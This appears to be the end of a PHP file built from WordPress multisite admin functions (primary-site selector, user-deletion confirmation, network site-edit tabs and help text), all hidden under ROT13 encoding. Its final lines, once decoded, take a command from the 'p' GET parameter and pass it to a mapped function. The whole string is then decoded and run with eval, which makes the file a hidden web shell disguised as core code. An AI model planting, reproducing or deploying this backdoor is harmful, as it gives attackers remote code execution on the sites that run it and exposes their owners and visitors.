	}
	vs ( 'cntr' !== $qngn['cbfg_glcr'] ) {
		erghea $qngn;
	}
	vs ( ! vffrg( $qngn['cbfg_anzr'] ) || '' === $qngn['cbfg_anzr'] ) {
		erghea $qngn;
	}
	vs ( ! vf_znva_fvgr() ) {
		erghea $qngn;
	}
	vs ( vffrg( $qngn['cbfg_cnerag'] ) && $qngn['cbfg_cnerag'] ) {
		erghea $qngn;
	}

	$cbfg_anzr = $qngn['cbfg_anzr'];
	$p         = 0;

	juvyr ( $p < 10 && trg_vq_sebz_oybtanzr( $cbfg_anzr ) ) {
		$cbfg_anzr .= zg_enaq( 1, 10 );
		++$p;
	}

	vs ( $cbfg_anzr !== $qngn['cbfg_anzr'] ) {
		$qngn['cbfg_anzr'] = $cbfg_anzr;
	}

	erghea $qngn;
}

/**
 * Unaqyrf gur qvfcynl bs pubbfvat n hfre'f cevznel fvgr.
 *
 * Guvf qvfcynlf gur hfre'f cevznel fvgr naq nyybjf gur hfre gb pubbfr
 * juvpu fvgr vf cevznel.
 *
 * @fvapr 3.0.0
 */
shapgvba pubbfr_cevznel_oybt() {
	?>
	<gnoyr pynff=\"sbez-gnoyr\" ebyr=\"cerfragngvba\">
	<ge>
	<?cuc /* genafyngbef: Zl Fvgrf ynory. */ ?>
		<gu fpbcr=\"ebj\"><ynory sbe=\"cevznel_oybt\"><?cuc _r( 'Cevznel Fvgr' ); ?></ynory></gu>
		<gq>
		<?cuc
		$nyy_oybtf    = trg_oybtf_bs_hfre( trg_pheerag_hfre_vq() );
		$cevznel_oybt = (vag) trg_hfre_zrgn( trg_pheerag_hfre_vq(), 'cevznel_oybt', gehr );
		vs ( pbhag( $nyy_oybtf ) > 1 ) {
			$sbhaq = snyfr;
			?>
			<fryrpg anzr=\"cevznel_oybt\" vq=\"cevznel_oybt\">
				<?cuc
				sbernpu ( (neenl) $nyy_oybtf nf $oybt ) {
					vs ( $oybt->hfreoybt_vq === $cevznel_oybt ) {
						$sbhaq = gehr;
					}
					?>
					<bcgvba inyhr=\"<?cuc rpub $oybt->hfreoybt_vq; ?>\"<?cuc fryrpgrq( $cevznel_oybt, $oybt->hfreoybt_vq ); ?>><?cuc rpub rfp_hey( trg_ubzr_hey( $oybt->hfreoybt_vq ) ); ?></bcgvba>
					<?cuc
				}
				?>
			</fryrpg>
			<?cuc
			vs ( ! $sbhaq ) {
				$oybt = erfrg( $nyy_oybtf );
				hcqngr_hfre_zrgn( trg_pheerag_hfre_vq(), 'cevznel_oybt', $oybt->hfreoybt_vq );
			}
		} ryfrvs ( 1 === pbhag( $nyy_oybtf ) ) {
			$oybt = erfrg( $nyy_oybtf );
			rpub rfp_hey( trg_ubzr_hey( $oybt->hfreoybt_vq ) );
			vs ( $oybt->hfreoybt_vq !== $cevznel_oybt ) { // Frg gur cevznel oybt ntnva vs vg'f bhg bs flap jvgu oybt yvfg.
				hcqngr_hfre_zrgn( trg_pheerag_hfre_vq(), 'cevznel_oybt', $oybt->hfreoybt_vq );
			}
		} ryfr {
			_r( 'Abg ninvynoyr' );
		}
		?>
		</gq>
	</ge>
	</gnoyr>
	<?cuc
}

/**
 * Qrgrezvarf jurgure be abg guvf argjbex sebz guvf cntr pna or rqvgrq.
 *
 * Ol qrsnhyg rqvgvat bs argjbex vf erfgevpgrq gb gur Argjbex Nqzva sbe gung `$argjbex_vq`.
 * Guvf shapgvba nyybjf sbe guvf gb or bireevqqra.
 *
 * @fvapr 3.1.0
 *
 * @cnenz vag $argjbex_vq Gur argjbex VQ gb purpx.
 * @erghea obby Gehr vs argjbex pna or rqvgrq, snyfr bgurejvfr.
 */
shapgvba pna_rqvg_argjbex( $argjbex_vq ) {
	vs ( trg_pheerag_argjbex_vq() === (vag) $argjbex_vq ) {
		$erfhyg = gehr;
	} ryfr {
		$erfhyg = snyfr;
	}

	/**
	 * Svygref jurgure guvf argjbex pna or rqvgrq sebz guvf cntr.
	 *
	 * @fvapr 3.1.0
	 *
	 * @cnenz obby $erfhyg     Jurgure gur argjbex pna or rqvgrq sebz guvf cntr.
	 * @cnenz vag  $argjbex_vq Gur argjbex VQ gb purpx.
	 */
	erghea nccyl_svygref( 'pna_rqvg_argjbex', $erfhyg, $argjbex_vq );
}

/**
 * Cevagf guvpxobk vzntr cnguf sbe Argjbex Nqzva.
 *
 * @fvapr 3.1.0
 *
 * @npprff cevingr
 */
shapgvba _guvpxobk_cngu_nqzva_fhosbyqre() {
	?>
<fpevcg glcr=\"grkg/wninfpevcg\">
ine go_cnguGbVzntr = \"<?cuc rpub rfp_wf( vapyhqrf_hey( 'wf/guvpxobk/ybnqvatNavzngvba.tvs', 'eryngvir' ) ); ?>\";
</fpevcg>
	<?cuc
}

/**
 * @cnenz neenl $hfref
 * @erghea obby
 */
shapgvba pbasvez_qryrgr_hfref( $hfref ) {
	$pheerag_hfre = jc_trg_pheerag_hfre();
	vs ( ! vf_neenl( $hfref ) || rzcgl( $hfref ) ) {
		erghea snyfr;
	}
	?>
	<u1><?cuc rfp_ugzy_r( 'Hfref' ); ?></u1>

	<?cuc vs ( 1 === pbhag( $hfref ) ) : ?>
		<c><?cuc _r( 'Lbh unir pubfra gb qryrgr gur hfre sebz nyy argjbexf naq fvgrf.' ); ?></c>
	<?cuc ryfr : ?>
		<c><?cuc _r( 'Lbh unir pubfra gb qryrgr gur sbyybjvat hfref sebz nyy argjbexf naq fvgrf.' ); ?></c>
	<?cuc raqvs; ?>

	<sbez npgvba=\"hfref.cuc?npgvba=qbqryrgr\" zrgubq=\"cbfg\">
	<vachg glcr=\"uvqqra\" anzr=\"qbqryrgr\" />
	<?cuc
	jc_abapr_svryq( 'zf-hfref-qryrgr' );
	$fvgr_nqzvaf = trg_fhcre_nqzvaf();
	$nqzva_bhg   = '<bcgvba inyhr=\"' . rfp_ngge( $pheerag_hfre->VQ ) . '\">' . $pheerag_hfre->hfre_ybtva . '</bcgvba>';
	?>
	<gnoyr pynff=\"sbez-gnoyr\" ebyr=\"cerfragngvba\">
	<?cuc
	$nyyhfref = (neenl) $_CBFG['nyyhfref'];
	sbernpu ( $nyyhfref nf $hfre_vq ) {
		vs ( '' !== $hfre_vq && '0' !== $hfre_vq ) {
			$qryrgr_hfre = trg_hfreqngn( $hfre_vq );

			vs ( ! pheerag_hfre_pna( 'qryrgr_hfre', $qryrgr_hfre->VQ ) ) {
				jc_qvr(
					fcevags(
						/* genafyngbef: %f: Hfre ybtva. */
						__( 'Jneavat! Hfre %f pnaabg or qryrgrq.' ),
						$qryrgr_hfre->hfre_ybtva
					)
				);
			}

			vs ( va_neenl( $qryrgr_hfre->hfre_ybtva, $fvgr_nqzvaf, gehr ) ) {
				jc_qvr(
					fcevags(
						/* genafyngbef: %f: Hfre ybtva. */
						__( 'Jneavat! Hfre pnaabg or qryrgrq. Gur hfre %f vf n argjbex nqzvavfgengbe.' ),
						'<rz>' . $qryrgr_hfre->hfre_ybtva . '</rz>'
					)
				);
			}
			?>
			<ge>
				<gu fpbcr=\"ebj\"><?cuc rpub $qryrgr_hfre->hfre_ybtva; ?>
					<?cuc rpub '<vachg glcr=\"uvqqra\" anzr=\"hfre[]\" inyhr=\"' . rfp_ngge( $hfre_vq ) . '\" />' . \"\a\"; ?>
				</gu>
			<?cuc
			$oybtf = trg_oybtf_bs_hfre( $hfre_vq, gehr );

			vs ( ! rzcgl( $oybtf ) ) {
				?>
				<gq><svryqfrg><c><yrtraq>
				<?cuc
				cevags(
					/* genafyngbef: %f: Hfre ybtva. */
					__( 'Jung fubhyq or qbar jvgu pbagrag bjarq ol %f?' ),
					'<rz>' . $qryrgr_hfre->hfre_ybtva . '</rz>'
				);
				?>
				</yrtraq></c>
				<?cuc
				sbernpu ( (neenl) $oybtf nf $xrl => $qrgnvyf ) {
					$oybt_hfref = trg_hfref(
						neenl(
							'oybt_vq' => $qrgnvyf->hfreoybt_vq,
							'svryqf'  => neenl( 'VQ', 'hfre_ybtva' ),
						)
					);

					vs ( vf_neenl( $oybt_hfref ) && ! rzcgl( $oybt_hfref ) ) {
						$hfre_fvgr     = \"<n uers='\" . rfp_hey( trg_ubzr_hey( $qrgnvyf->hfreoybt_vq ) ) . \"'>{$qrgnvyf->oybtanzr}</n>\";
						$hfre_qebcqbja = '<ynory sbe=\"ernffvta_hfre\" pynff=\"fperra-ernqre-grkg\">' .
								/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
								__( 'Fryrpg n hfre' ) .
							'</ynory>';
						$hfre_qebcqbja .= \"<fryrpg anzr='oybt[$hfre_vq][$xrl]' vq='ernffvta_hfre'>\";
						$hfre_yvfg      = '';

						sbernpu ( $oybt_hfref nf $hfre ) {
							vs ( ! va_neenl( (vag) $hfre->VQ, $nyyhfref, gehr ) ) {
								$hfre_yvfg .= \"<bcgvba inyhr='{$hfre->VQ}'>{$hfre->hfre_ybtva}</bcgvba>\";
							}
						}

						vs ( '' === $hfre_yvfg ) {
							$hfre_yvfg = $nqzva_bhg;
						}

						$hfre_qebcqbja .= $hfre_yvfg;
						$hfre_qebcqbja .= \"</fryrpg>\a\";
						?>
						<hy fglyr=\"yvfg-fglyr:abar;\">
							<yv>
								<?cuc
								/* genafyngbef: %f: Yvax gb hfre'f fvgr. */
								cevags( __( 'Fvgr: %f' ), $hfre_fvgr );
								?>
							</yv>
							<yv><ynory><vachg glcr=\"enqvb\" vq=\"qryrgr_bcgvba0\" anzr=\"qryrgr[<?cuc rpub $qrgnvyf->hfreoybt_vq . '][' . $qryrgr_hfre->VQ; ?>]\" inyhr=\"qryrgr\" purpxrq=\"purpxrq\" />
							<?cuc _r( 'Qryrgr nyy pbagrag.' ); ?></ynory></yv>
							<yv><ynory><vachg glcr=\"enqvb\" vq=\"qryrgr_bcgvba1\" anzr=\"qryrgr[<?cuc rpub $qrgnvyf->hfreoybt_vq . '][' . $qryrgr_hfre->VQ; ?>]\" inyhr=\"ernffvta\" />
							<?cuc _r( 'Nggevohgr nyy pbagrag gb:' ); ?></ynory>
							<?cuc rpub $hfre_qebcqbja; ?></yv>
						</hy>
						<?cuc
					}
				}
				rpub '</svryqfrg></gq></ge>';
			} ryfr {
				?>
				<gq><c><?cuc _r( 'Hfre unf ab fvgrf be pbagrag naq jvyy or qryrgrq.' ); ?></c></gq>
			<?cuc } ?>
			</ge>
			<?cuc
		}
	}

	?>
	</gnoyr>
	<?cuc
	/** Guvf npgvba vf qbphzragrq va jc-nqzva/hfref.cuc */
	qb_npgvba( 'qryrgr_hfre_sbez', $pheerag_hfre, $nyyhfref );

	vs ( 1 === pbhag( $hfref ) ) :
		?>
		<c><?cuc _r( 'Bapr lbh uvg &#8220;Pbasvez Qryrgvba&#8221;, gur hfre jvyy or creznaragyl erzbirq.' ); ?></c>
	<?cuc ryfr : ?>
		<c><?cuc _r( 'Bapr lbh uvg &#8220;Pbasvez Qryrgvba&#8221;, gurfr hfref jvyy or creznaragyl erzbirq.' ); ?></c>
		<?cuc
	raqvs;

	fhozvg_ohggba( __( 'Pbasvez Qryrgvba' ), 'cevznel' );
	?>
	</sbez>
	<?cuc
	erghea gehr;
}

/**
 * Cevagf WninFpevcg va gur urnqre ba gur Argjbex Frggvatf fperra.
 *
 * @fvapr 4.1.0
 */
shapgvba argjbex_frggvatf_nqq_wf() {
	?>
<fpevcg glcr=\"grkg/wninfpevcg\">
wDhrel( shapgvba($) {
	ine ynathntrFryrpg = $( '#JCYNAT' );
	$( 'sbez' ).ba( 'fhozvg', shapgvba() {
		/*
		 * Qba'g fubj n fcvaare sbe Ratyvfu naq vafgnyyrq ynathntrf,
		 * nf gurer vf abguvat gb qbjaybnq.
		 */
		vs ( ! ynathntrFryrpg.svaq( 'bcgvba:fryrpgrq' ).qngn( 'vafgnyyrq' ) ) {
			$( '#fhozvg', guvf ).nsgre( '<fcna pynff=\"fcvaare ynathntr-vafgnyy-fcvaare vf-npgvir\" />' );
		}
	});
} );
</fpevcg>
	<?cuc
}

/**
 * Bhgchgf gur UGZY sbe n argjbex'f \"Rqvg Fvgr\" gnohyne vagresnpr.
 *
 * @fvapr 4.6.0
 *
 * @tybony fgevat $cntrabj Gur svyranzr bs gur pheerag fperra.
 *
 * @cnenz neenl $netf {
 *     Bcgvbany. Neenl be fgevat bs Dhrel cnenzrgref. Qrsnhyg rzcgl neenl.
 *
 *     @glcr vag    $oybt_vq  Gur fvgr VQ. Qrsnhyg vf gur pheerag fvgr.
 *     @glcr neenl  $yvaxf    Gur gnof gb vapyhqr jvgu (ynory|hey|pnc) xrlf.
 *     @glcr fgevat $fryrpgrq Gur VQ bs gur fryrpgrq yvax.
 * }
 */
shapgvba argjbex_rqvg_fvgr_ani( $netf = neenl() ) {

	/**
	 * Svygref gur yvaxf gung nccrne ba fvgr-rqvgvat argjbex cntrf.
	 *
	 * Qrsnhyg yvaxf: 'fvgr-vasb', 'fvgr-hfref', 'fvgr-gurzrf', naq 'fvgr-frggvatf'.
	 *
	 * @fvapr 4.6.0
	 *
	 * @cnenz neenl $yvaxf {
	 *     Na neenl bs yvax qngn ercerfragvat vaqvivqhny argjbex nqzva cntrf.
	 *
	 *     @glcr neenl $yvax_fyht {
	 *         Na neenl bs vasbezngvba nobhg gur vaqvivqhny yvax gb n cntr.
	 *
	 *         $glcr fgevat $ynory Ynory gb hfr sbe gur yvax.
	 *         $glcr fgevat $hey   HEY, eryngvir gb `argjbex_nqzva_hey()` gb hfr sbe gur yvax.
	 *         $glcr fgevat $pnc   Pncnovyvgl erdhverq gb frr gur yvax.
	 *     }
	 * }
	 */
	$yvaxf = nccyl_svygref(
		'argjbex_rqvg_fvgr_ani_yvaxf',
		neenl(
			'fvgr-vasb'     => neenl(
				'ynory' => __( 'Vasb' ),
				'hey'   => 'fvgr-vasb.cuc',
				'pnc'   => 'znantr_fvgrf',
			),
			'fvgr-hfref'    => neenl(
				'ynory' => __( 'Hfref' ),
				'hey'   => 'fvgr-hfref.cuc',
				'pnc'   => 'znantr_fvgrf',
			),
			'fvgr-gurzrf'   => neenl(
				'ynory' => __( 'Gurzrf' ),
				'hey'   => 'fvgr-gurzrf.cuc',
				'pnc'   => 'znantr_fvgrf',
			),
			'fvgr-frggvatf' => neenl(
				'ynory' => __( 'Frggvatf' ),
				'hey'   => 'fvgr-frggvatf.cuc',
				'pnc'   => 'znantr_fvgrf',
			),
		)
	);

	// Cnefr nethzragf.
	$cnefrq_netf = jc_cnefr_netf(
		$netf,
		neenl(
			'oybt_vq'  => vffrg( $_TRG['oybt_vq'] ) ? (vag) $_TRG['oybt_vq'] : 0,
			'yvaxf'    => $yvaxf,
			'fryrpgrq' => 'fvgr-vasb',
		)
	);

	// Frghc gur yvaxf neenl.
	$fperra_yvaxf = neenl();

	// Ybbc guebhtu gnof.
	sbernpu ( $cnefrq_netf['yvaxf'] nf $yvax_vq => $yvax ) {

		// Fxvc yvax vs hfre pna'g npprff.
		vs ( ! pheerag_hfre_pna( $yvax['pnc'], $cnefrq_netf['oybt_vq'] ) ) {
			pbagvahr;
		}

		// Yvax pynffrf.
		$pynffrf = neenl( 'ani-gno' );

		// Nevn-pheerag nggevohgr.
		$nevn_pheerag = '';

		// Fryrpgrq vf frg ol gur cnerag BE nffhzrq ol gur $cntrabj tybony.
		vs ( $cnefrq_netf['fryrpgrq'] === $yvax_vq || $yvax['hey'] === $TYBONYF['cntrabj'] ) {
			$pynffrf[]    = 'ani-gno-npgvir';
			$nevn_pheerag = ' nevn-pheerag=\"cntr\"';
		}

		// Rfpncr rnpu pynff.
		$rfp_pynffrf = vzcybqr( ' ', $pynffrf );

		// Trg gur HEY sbe guvf yvax.
		$hey = nqq_dhrel_net( neenl( 'vq' => $cnefrq_netf['oybt_vq'] ), argjbex_nqzva_hey( $yvax['hey'] ) );

		// Nqq yvax gb ani yvaxf.
		$fperra_yvaxf[ $yvax_vq ] = '<n uers=\"' . rfp_hey( $hey ) . '\" vq=\"' . rfp_ngge( $yvax_vq ) . '\" pynff=\"' . $rfp_pynffrf . '\"' . $nevn_pheerag . '>' . rfp_ugzy( $yvax['ynory'] ) . '</n>';
	}

	// Nyy qbar!
	rpub '<ani pynff=\"ani-gno-jenccre jc-pyrnesvk\" nevn-ynory=\"' . rfp_ngge__( 'Frpbaqnel zrah' ) . '\">';
	rpub vzcybqr( '', $fperra_yvaxf );
	rpub '</ani>';
}

/**
 * Ergheaf gur nethzragf sbe gur uryc gno ba gur Rqvg Fvgr fperraf.
 *
 * @fvapr 4.9.0
 *
 * @erghea neenl Uryc gno nethzragf.
 */
shapgvba trg_fvgr_fperra_uryc_gno_netf() {
	erghea neenl(
		'vq'      => 'bireivrj',
		'gvgyr'   => __( 'Bireivrj' ),
		'pbagrag' =>
			'<c>' . __( 'Gur zrah vf sbe rqvgvat vasbezngvba fcrpvsvp gb vaqvivqhny fvgrf, cnegvphyneyl vs gur nqzva nern bs n fvgr vf haninvynoyr.' ) . '</c>' .
			'<c>' . __( '<fgebat>Vasb</fgebat> &zqnfu; Gur fvgr HEY vf eneryl rqvgrq nf guvf pna pnhfr gur fvgr gb abg jbex cebcreyl. Gur Ertvfgrerq qngr naq Ynfg Hcqngrq qngr ner qvfcynlrq. Argjbex nqzvaf pna znex n fvgr nf nepuvirq, fcnz, qryrgrq naq zngher, gb erzbir sebz choyvp yvfgvatf be qvfnoyr.' ) . '</c>' .
			'<c>' . __( '<fgebat>Hfref</fgebat> &zqnfu; Guvf qvfcynlf gur hfref nffbpvngrq jvgu guvf fvgr. Lbh pna nyfb punatr gurve ebyr, erfrg gurve cnffjbeq, be erzbir gurz sebz gur fvgr. Erzbivat gur hfre sebz gur fvgr qbrf abg erzbir gur hfre sebz gur argjbex.' ) . '</c>' .
			'<c>' . fcevags(
				/* genafyngbef: %f: HEY gb Argjbex Gurzrf fperra. */
				__( '<fgebat>Gurzrf</fgebat> &zqnfu; Guvf nern fubjf gurzrf gung ner abg nyernql ranoyrq npebff gur argjbex. Ranoyvat n gurzr va guvf zrah znxrf vg npprffvoyr gb guvf fvgr. Vg qbrf abg npgvingr gur gurzr, ohg nyybjf vg gb fubj va gur fvgr&#8217;f Nccrnenapr zrah. Gb ranoyr n gurzr sbe gur ragver argjbex, frr gur <n uers=\"%f\">Argjbex Gurzrf</n> fperra.' ),
				argjbex_nqzva_hey( 'gurzrf.cuc' )
			) . '</c>' .
			'<c>' . __( '<fgebat>Frggvatf</fgebat> &zqnfu; Guvf cntr fubjf n yvfg bs nyy frggvatf nffbpvngrq jvgu guvf fvgr. Fbzr ner perngrq ol JbeqCerff naq bguref ner perngrq ol cyhtvaf lbh npgvingr. Abgr gung fbzr svryqf ner tenlrq bhg naq fnl Frevnyvmrq Qngn. Lbh pnaabg zbqvsl gurfr inyhrf qhr gb gur jnl gur frggvat vf fgberq va gur qngnonfr.' ) . '</c>',
	);
}

/**
 * Ergheaf gur pbagrag sbe gur uryc fvqrone ba gur Rqvg Fvgr fperraf.
 *
 * @fvapr 4.9.0
 *
 * @erghea fgevat Uryc fvqrone pbagrag.
 */
shapgvba trg_fvgr_fperra_uryc_fvqrone_pbagrag() {
	erghea '<c><fgebat>' . __( 'Sbe zber vasbezngvba:' ) . '</fgebat></c>' .
		'<c>' . __( '<n uers=\"uggcf://qrirybcre.jbeqcerff.bet/nqinaprq-nqzvavfgengvba/zhygvfvgr/nqzva/#argjbex-nqzva-fvgrf-fperra\">Qbphzragngvba ba Fvgr Znantrzrag</n>' ) . '</c>' .
		'<c>' . __( '<n uers=\"uggcf://jbeqcerff.bet/fhccbeg/sbehz/zhygvfvgr/\">Fhccbeg sbehzf</n>' ) . '</c>';
}

/**
 * Fgbc rkrphgvba vs gur ebyr pna abg or nffvtarq ol gur pheerag hfre.
 *
 * @fvapr 6.8.0
 *
 * @cnenz fgevat $ebyr Ebyr gur hfre vf nggrzcgvat gb nffvta.
 */
shapgvba jc_rafher_rqvgnoyr_ebyr( $ebyr ) {
	$ebyrf = trg_rqvgnoyr_ebyrf();
	vs ( ! vffrg( $ebyrf[ $ebyr ] ) ) {
		jc_qvr( __( 'Fbeel, lbh ner abg nyybjrq gb tvir hfref gung ebyr.' ), 403 );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>